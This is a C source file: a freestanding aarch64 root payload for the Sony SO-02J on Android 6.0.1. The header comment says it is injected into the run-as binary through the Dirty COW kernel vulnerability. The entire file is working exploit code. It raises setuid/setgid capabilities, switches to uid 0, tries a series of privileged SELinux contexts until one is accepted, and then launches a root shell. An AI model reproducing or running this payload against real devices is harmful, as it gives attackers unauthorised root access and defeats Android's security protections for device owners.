/* In-memory temporary root for Sony SO-02J (Android 6.0.1 / 34.1.B.0.336).
 * Injected into /system/bin/run-as via Dirty COW (runas_exec grants CAP_SETUID).
 * Freestanding aarch64, pure syscalls, no libc, no .bss.
 *
 * Tries a list of SELinux contexts via /proc/self/attr/current, stops at the
 * first one the policy allows, then execs /system/bin/sh reading stdin.
 * Most privileged candidates first, so a permissive transition wins.
 */
typedef unsigned long u64;

static long sys3(long n, long a, long b, long c) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x8), "r"(x1), "r"(x2)
                     : "memory");
    return x0;
}
struct cap_hdr { u64 version; int pid; };
struct cap_data { u64 effective; u64 permitted; u64 inheritable; };

static void put(char *m, unsigned int *n, const char *s) { while (*s) m[(*n)++] = *s++; }
static void num(char *m, unsigned int *n, long v) {
    char t[24]; int k = 0;
    if (v < 0) { m[(*n)++] = '-'; v = -v; }
    if (v == 0) { m[(*n)++] = '0'; return; }
    while (v > 0) { t[k++] = (char)('0' + v % 10); v /= 10; }
    while (k > 0) m[(*n)++] = t[--k];
}

static const char *CTX[] = {
    "u:r:kernel:s0",
    "u:r:init:s0",
    "u:r:zygote:s0",
    "u:r:system_server:s0",
    "u:r:su:s0",
    "u:r:shell:s0",
    "u:r:platform_app:s0",
    0
};

void _start(void) {
    struct cap_hdr h;
    struct cap_data d[2];
    char msg[256];
    unsigned int mlen = 0;
    long i, fd, rc, chosen = -1;
    const char *attr = "/proc/self/attr/current";
    const char *sh_path = "/system/bin/sh";
    const char *argv[2];
    const char *envp[1];

    for (i = 0; i < (long)sizeof(h); ++i) ((char *)&h)[i] = 0;
    for (i = 0; i < (long)sizeof(d); ++i) ((char *)d)[i] = 0;
    h.version = 0x20080522;
    h.pid = 0;
    d[0].effective = (1UL << 6) | (1UL << 7);
    d[0].permitted = (1UL << 6) | (1UL << 7);

    sys3(91 /*capset*/, (long)&h, (long)d, 0);
    sys3(159 /*setgroups*/, 0, 0, 0);
    sys3(149 /*setresgid*/, 0, 0, 0);
    sys3(147 /*setresuid*/, 0, 0, 0);

    for (i = 0; CTX[i] != 0; ++i) {
        const char *c = CTX[i];
        long len = 0;
        while (c[len]) ++len;
        fd = sys3(56 /*openat*/, -100, (long)attr, 1 /*O_WRONLY*/);
        if (fd < 0) continue;
        rc = sys3(64 /*write*/, fd, (long)c, len);
        sys3(57 /*close*/, fd, 0, 0);
        if (rc == len) { chosen = i; break; }
    }

    put(msg, &mlen, "uid="); num(msg, &mlen, sys3(174 /*getuid*/, 0, 0, 0));
    put(msg, &mlen, " euid="); num(msg, &mlen, sys3(175 /*geteuid*/, 0, 0, 0));
    put(msg, &mlen, " ctx_index="); num(msg, &mlen, chosen);
    put(msg, &mlen, " ctx=");
    if (chosen >= 0) put(msg, &mlen, CTX[chosen]); else put(msg, &mlen, "NONE");
    put(msg, &mlen, "\n");
    sys3(64 /*write*/, 1, (long)msg, mlen);

    argv[0] = "sh"; argv[1] = 0; envp[0] = 0;
    sys3(221 /*execve*/, (long)sh_path, (long)argv, (long)envp);
    sys3(93 /*exit*/, 0, 0, 0);
    for (;;) {}
}
